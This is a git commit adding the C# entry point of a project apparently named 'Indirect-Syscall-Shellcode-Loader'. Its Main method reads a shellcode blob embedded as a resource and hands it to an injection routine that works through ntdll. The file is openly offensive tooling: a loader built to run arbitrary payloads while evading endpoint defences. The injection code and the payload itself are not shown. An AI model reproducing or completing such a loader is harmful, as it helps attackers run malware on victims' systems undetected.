1d9e027b9b2706a3357bc5b0cdd7589802bd28e5
susMdT <68256613+susMdT@users.noreply.github.com>
2022-11-11 19:19:40 -0800

    Add files via upload

---
+++ Indirect-Syscall-Shellcode-Loader/Jit Tripping/Program.cs
@@ -0,0 +1,33 @@
+﻿using System;
+using System.Runtime.InteropServices;
+using System.Threading;
+using System.Diagnostics;
+using System.Text;
+using System.Net;
+using System.Reflection;
+using System.Linq;
+using System.Runtime.CompilerServices;
+using System.IO;
+namespace Jit_Tripping
+{
+    class Program
+    {
+        public static void Main()
+        {
+            dll ntdll = new dll();
+            byte[] bytes = new byte[] {};
+            string [] resource_names = Assembly.GetExecutingAssembly().GetManifestResourceNames();
+
+            if (resource_names.Contains("Jit_Tripping.shellcode"))
+            {
+                var ms = new MemoryStream();
+                Stream resStream = Assembly.GetExecutingAssembly().GetManifestResourceStream("Jit_Tripping.shellcode");
+                resStream.CopyTo(ms);
+                bytes = ms.ToArray();
+            }
+   
+            Utils.inject(bytes, ntdll);
+
+        }
+    }
+}
